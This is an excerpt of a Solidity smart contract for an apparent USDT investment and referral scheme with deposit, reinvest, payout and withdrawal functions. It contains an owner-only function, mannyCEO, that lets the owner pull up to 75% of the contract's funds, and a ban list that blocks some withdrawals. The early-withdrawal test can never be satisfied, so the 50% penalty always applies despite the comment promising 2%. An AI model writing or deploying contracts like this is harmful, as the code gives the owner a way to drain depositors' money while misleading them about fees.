...
contract DynastyExchangeVentures is Context, Ownable {
    ...
    uint16[1] private ref_bonuses = [2]; 

    uint256 public invested;
    uint256 public reinvested;
    uint256 public withdrawn;
    uint256 public mannyWithdrawn;
    ...
    constructor() {         
        ...
        paymentTokenAddress = 0xc2132D05D31c914a87C6611C10748AEb04B58e8F; //USDT
		USD = IERC20(paymentTokenAddress);       
    }   
   
    function Deposit(address _upline, uint256 amount) external {
        require(amount >= 20e6, "Minimum Deposit is 20 USDT!");
    ...
    function Reinvest() external {   
        ...
        require(player.dividends >= 10e6, "Minimum reinvest is 10 USDT.");
    ...
    function Payout() external {      
        ...
        require(player.dividends >= 10e6, "Minimum payout is 10 USDT.");
    ...
    function mannyCEO(uint256 amount) public onlyOwner returns (bool success) {
        require(getContractBalance() * 75 / 100 > mannyWithdrawn + amount, "Owner could not contract over 75% of TVL");
	    
        USD.safeTransfer(msg.sender, amount);
		withdrawn += amount;
        mannyWithdrawn += amount;
        return true;
    }
	...
	function withdrawInitial() public returns (bool success) {
        if(banned[msg.sender] == 1){ return false; }
		Player storage player = players[msg.sender];    
        ...
        uint256 teamFee;
        uint256 penaltyFee;
        if (player.deposits[0].time + 1 days > block.timestamp  && player.deposits[0].time + 90 days < block.timestamp) { // In 24hours or After 90 days
            teamFee = refund / 100;
            penaltyFee = refund * 2 / 100;
        } else {
            teamFee = refund / 100;
            penaltyFee = refund * 50 / 100;
        }
        refund = refund - teamFee -  penaltyFee;
